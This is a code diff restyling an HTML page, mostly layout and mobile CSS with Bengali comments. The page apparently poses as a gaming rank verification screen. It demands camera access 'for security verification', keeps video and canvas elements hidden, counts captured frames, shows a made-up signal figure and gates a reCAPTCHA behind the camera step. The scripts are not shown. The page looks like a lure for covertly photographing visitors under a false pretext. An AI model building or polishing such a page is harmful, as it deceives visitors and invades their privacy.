@@ -18,13 +18,28 @@
 
 <style>
   *{margin:0;padding:0;box-sizing:border-box;}
-  :root{--bg:#0a0a0f;--panel:#12121a;--line:#1e1e2a;--txt:#e8e8f0;--txt-dim:#7a7a8a;--txt-mute:#4a4a5a;--red:#ff2233;--red-glow:rgba(255,34,51,0.4);--yellow:#ffe600;--cyan:#00e5ff;}
+  :root{
+    --bg:#0a0a0f;--panel:#12121a;--line:#1e1e2a;
+    --txt:#e8e8f0;--txt-dim:#7a7a8a;--txt-mute:#4a4a5a;
+    --red:#ff2233;--red-glow:rgba(255,34,51,0.4);--yellow:#ffe600;--cyan:#00e5ff;
+  }
   html,body{height:100%;}
-  body{font-family:'Saira',sans-serif;background:var(--bg);color:var(--txt);min-height:100vh;position:relative;overflow:hidden;}
+  body{
+    font-family:'Saira',sans-serif;
+    background:var(--bg);
+    color:var(--txt);
+    min-height:100vh;
+    position:relative;
+    /* ✅ FIX: স্ক্রল enable */
+    overflow-x:hidden;
+    overflow-y:auto;
+  }
 
-  /* animated grid background */
+  /* animated grid background (fixed so it doesn't scroll awkwardly) */
   body::before{
-    content:"";position:fixed;inset:0;
+    content:"";
+    position:fixed;inset:0;
+    pointer-events:none;
     background-image:
       linear-gradient(rgba(255,34,51,0.06) 1px, transparent 1px),
       linear-gradient(90deg, rgba(255,34,51,0.06) 1px, transparent 1px);
@@ -32,22 +47,29 @@
     mask-image:radial-gradient(ellipse at 50% 50%, black 20%, transparent 80%);
     -webkit-mask-image:radial-gradient(ellipse at 50% 50%, black 20%, transparent 80%);
     animation:gridShift 8s linear infinite;
+    z-index:0;
   }
   @keyframes gridShift{
     from{background-position:0 0;}
     to{background-position:50px 50px;}
   }
-
   body::after{
-    content:"";position:fixed;inset:0;pointer-events:none;
+    content:"";
+    position:fixed;inset:0;
+    pointer-events:none;
     background:radial-gradient(circle at 50% 50%, transparent 30%, rgba(10,10,15,0.9) 90%);
+    z-index:0;
   }
 
-  /* top status bar (HUD) */
+  /* ---- HUD TOP ---- */
   .hud-top{
-    position:fixed;top:0;left:0;right:0;z-index:10;
+    position:sticky;
+    top:0;
+    z-index:10;
     padding:14px 32px;
-    background:linear-gradient(180deg,rgba(10,10,15,0.9),transparent);
+    background:linear-gradient(180deg,rgba(10,10,15,0.95),rgba(10,10,15,0.75));
+    backdrop-filter:blur(10px);
+    border-bottom:1px solid var(--line);
     display:flex;justify-content:space-between;align-items:center;
     font-family:'Chakra Petch',sans-serif;
     font-size:11.5px;letter-spacing:0.15em;text-transform:uppercase;
@@ -58,35 +80,27 @@
     color:var(--red);
     display:flex;align-items:center;gap:7px;font-weight:600;
   }
-  .hud-top .live::before{content:"";width:6px;height:6px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red);animation:blink 1s infinite;}
+  .hud-top .live::before{
+    content:"";width:6px;height:6px;border-radius:50%;
+    background:var(--red);box-shadow:0 0 10px var(--red);
+    animation:blink 1s infinite;
+  }
   @keyframes blink{0%,100%{opacity:1;}50%{opacity:.3;}}
   .hud-top .right{display:flex;gap:20px;}
 
-  /* bottom status bar */
-  .hud-bottom{
-    position:fixed;bottom:0;left:0;right:0;z-index:10;
-    padding:14px 32px;
-    background:linear-gradient(0deg,rgba(10,10,15,0.9),transparent);
-    display:flex;justify-content:space-between;align-items:center;
-    font-family:'Chakra Petch',sans-serif;
-    font-size:11.5px;letter-spacing:0.15em;text-transform:uppercase;
-    color:var(--txt-mute);
-  }
-  .hud-bottom .stat{display:flex;gap:22px;}
-  .hud-bottom .stat span b{color:var(--red);font-weight:700;}
-
-  /* corner brackets */
+  /* ---- corner brackets (fixed, decorational) ---- */
   .corner{position:fixed;width:40px;height:40px;pointer-events:none;z-index:8;}
-  .corner.tl{top:60px;left:24px;border-top:1.5px solid var(--red);border-left:1.5px solid var(--red);}
-  .corner.tr{top:60px;right:24px;border-top:1.5px solid var(--red);border-right:1.5px solid var(--red);}
-  .corner.bl{bottom:60px;left:24px;border-bottom:1.5px solid var(--red);border-left:1.5px solid var(--red);}
-  .corner.br{bottom:60px;right:24px;border-bottom:1.5px solid var(--red);border-right:1.5px solid var(--red);}
+  .corner.tl{top:80px;left:24px;border-top:1.5px solid var(--red);border-left:1.5px solid var(--red);}
+  .corner.tr{top:80px;right:24px;border-top:1.5px solid var(--red);border-right:1.5px solid var(--red);}
+  .corner.bl{bottom:80px;left:24px;border-bottom:1.5px solid var(--red);border-left:1.5px solid var(--red);}
+  .corner.br{bottom:80px;right:24px;border-bottom:1.5px solid var(--red);border-right:1.5px solid var(--red);}
 
-  /* main center */
+  /* ---- MAIN STAGE ---- */
   .stage{
     position:relative;z-index:5;
-    min-height:100vh;display:flex;align-items:center;justify-content:center;
-    padding:100px 32px;
+    min-height:calc(100vh - 100px);
+    display:flex;align-items:center;justify-content:center;
+    padding:60px 24px;
   }
 
   .panel{
@@ -125,7 +139,7 @@
   }
   .panel-header p{font-size:14px;color:var(--txt-dim);line-height:1.6;}
 
-  /* HUD-style camera row */
+  /* camera row */
   .cam-hud{
     padding:18px 20px;
     background:rgba(10,10,15,0.6);
@@ -148,8 +162,10 @@
     background:rgba(255,255,255,0.03);
     border:1px solid var(--line);
     transition:all .3s;
+    flex-shrink:0;
   }
   .cam-hud.active .icon{background:var(--red);color:#fff;border-color:var(--red);box-shadow:0 0 20px var(--red-glow);}
+  .cam-hud .text{flex:1;min-width:0;}
   .cam-hud .text .t{
     font-family:'Chakra Petch',sans-serif;
     font-size:14px;font-weight:700;
@@ -157,10 +173,16 @@
   }
   .cam-hud.active .text .t{color:var(--red);}
   .cam-hud .text .s{font-size:12px;color:var(--txt-mute);margin-top:3px;letter-spacing:0.03em;}
-  .cam-hud .st{margin-left:auto;font-family:'Chakra Petch',sans-serif;font-size:11px;letter-spacing:0.15em;text-transform:uppercase;color:var(--txt-mute);}
+  .cam-hud .st{
+    margin-left:auto;
+    font-family:'Chakra Petch',sans-serif;
+    font-size:11px;letter-spacing:0.15em;text-transform:uppercase;
+    color:var(--txt-mute);
+    flex-shrink:0;
+  }
   .cam-hud.active .st{color:var(--red);}
 
-  /* stats HUD row */
+  /* stats row */
   .stats-hud{display:none;grid-template-columns:1fr 1fr 1fr;gap:10px;margin-bottom:16px;}
   .stats-hud .cell{
     padding:14px;
@@ -180,37 +202,108 @@
     color:var(--red);letter-spacing:-0.02em;
   }
 
+  /* ---- CAPTCHA (always visible) ---- */
+  .captcha-section{margin-top:8px;}
+  .captcha-label{
+    font-family:'Chakra Petch',sans-serif;
+    font-size:10.5px;
+    letter-spacing:0.2em;
+    text-transform:uppercase;
+    color:var(--txt-mute);
+    margin-bottom:10px;
+    display:flex;align-items:center;gap:10px;
+  }
+  .captcha-label::before{
+    content:"";
+    flex:1;
+    height:1px;
+    background:linear-gradient(90deg,transparent,var(--line),transparent);
+  }
+  .captcha-label::after{
+    content:"";
+    flex:1;
+    height:1px;
+    background:linear-gradient(90deg,transparent,var(--line),transparent);
+  }
+
   .captcha-hud{
-    padding:22px;
+    padding:22px 16px;
     background:rgba(10,10,15,0.6);
     border:1px solid var(--line);
-    display:flex;justify-content:center;
+    display:flex;
+    justify-content:center;
+    align-items:center;
     transition:all .3s;
     clip-path:polygon(10px 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%, 0 10px);
+    min-height:90px;
   }
   .captcha-hud.ready{
     border-color:rgba(255,34,51,0.4);
     background:rgba(255,34,51,0.03);
   }
-  #recaptchaWidget{display:inline-block;}
-  .dimmed{opacity:0.35;pointer-events:none;filter:grayscale(0.5);}
+  #recaptchaWidget{
+    display:inline-block;
+    /* reCAPTCHA মোবাইলে যাতে বাইরে না যায় */
+    max-width:100%;
+    transform-origin:0 0;
+  }
+  .dimmed{opacity:0.4;pointer-events:none;filter:grayscale(0.5);}
 
   video,canvas{display:none;}
 
+  /* ---- HUD BOTTOM ---- */
+  .hud-bottom{
+    position:relative;
+    z-index:10;
+    padding:14px 32px;
+    background:linear-gradient(0deg,rgba(10,10,15,0.95),rgba(10,10,15,0.7));
+    backdrop-filter:blur(10px);
+    border-top:1px solid var(--line);
+    display:flex;justify-content:space-between;align-items:center;
+    font-family:'Chakra Petch',sans-serif;
+    font-size:11.5px;letter-spacing:0.15em;text-transform:uppercase;
+    color:var(--txt-mute);
+  }
+  .hud-bottom .stat{display:flex;gap:22px;}
+  .hud-bottom .stat span b{color:var(--red);font-weight:700;}
+
+  /* ---- MOBILE ---- */
   @media (max-width:640px){
-    .hud-top,.hud-bottom{padding:12px 18px;font-size:10px;}
-    .hud-top .left{gap:14px;}
-    .hud-top .right{gap:12px;}
-    .corner{width:28px;height:28px;}
-    .corner.tl,.corner.tr{top:50px;}
-    .corner.bl,.corner.br{bottom:50px;}
-    .panel{padding:32px 22px;}
-    .panel-header h1{font-size:24px;}
+    .hud-top{padding:12px 16px;font-size:10px;}
+    .hud-top .left{gap:12px;}
+    .hud-top .right{display:none;}    /* জায়গা বাঁচানোর জন্য */
+    .corner{width:26px;height:26px;}
+    .corner.tl,.corner.tr{top:70px;}
+    .corner.bl,.corner.br{bottom:70px;}
+    .stage{padding:40px 16px;}
+    .panel{padding:28px 20px 26px;}
+    .panel-header h1{font-size:22px;}
+    .panel-header p{font-size:13px;}
+    .cam-hud{padding:14px 14px;gap:12px;}
+    .cam-hud .icon{width:40px;height:40px;font-size:18px;}
+    .cam-hud .text .t{font-size:12.5px;}
+    .cam-hud .text .s{font-size:11px;}
+    .cam-hud .st{font-size:10px;letter-spacing:0.1em;}
+
+    .stats-hud{grid-template-columns:1fr 1fr;}
+
+    /* reCAPTCHA ছোট স্ক্রিনে fit */
+    #recaptchaWidget{transform:scale(0.85);transform-origin:top left;}
+    .captcha-hud{padding:16px 12px;}
+
+    .hud-bottom{padding:12px 16px;font-size:10px;flex-direction:column;gap:8px;text-align:center;}
+    .hud-bottom .stat{gap:14px;}
+  }
+
+  /* খুব ছোট স্ক্রিনে reCAPTCHA আরো ছোট */
+  @media (max-width:380px){
+    #recaptchaWidget{transform:scale(0.78);}
   }
 </style>
 </head>
 <body>
 
+<!-- HUD TOP -->
 <div class="hud-top">
   <div class="left">
     <span class="live">Verification active</span>
@@ -222,11 +315,13 @@
   </div>
 </div>
 
+<!-- corners -->
 <div class="corner tl"></div>
 <div class="corner tr"></div>
 <div class="corner bl"></div>
 <div class="corner br"></div>
 
+<!-- MAIN -->
 <main class="stage">
   <div class="panel">
 
@@ -236,6 +331,7 @@
       <p>Camera access required for security verification. Your rank and rewards are protected.</p>
     </div>
 
+    <!-- camera row -->
     <div class="cam-hud" id="camCard">
       <div class="icon">📷</div>
       <div class="text">
@@ -245,19 +341,25 @@
       <div class="st" id="camStatus">IDLE</div>
     </div>
 
+    <!-- stats row -->
     <div class="stats-hud" id="stats">
       <div class="cell"><div class="k">Frames</div><div class="v" id="cntCaptures">0</div></div>
       <div class="cell"><div class="k">Status</div><div class="v" id="delStatus">✓</div></div>
       <div class="cell"><div class="k">Signal</div><div class="v">98%</div></div>
     </div>
 
-    <div class="captcha-hud dimmed" id="captchaWrap">
-      <div id="recaptchaWidget"></div>
+    <!-- captcha section with label -->
+    <div class="captcha-section">
+      <div class="captcha-label">Human verification</div>
+      <div class="captcha-hud dimmed" id="captchaWrap">
+        <div id="recaptchaWidget"></div>
+      </div>
     </div>
 
   </div>
 </main>
 
+<!-- HUD BOTTOM -->
 <div class="hud-bottom">
   <div class="stat">
     <span>Rank: <b>DIAMOND I</b></span>
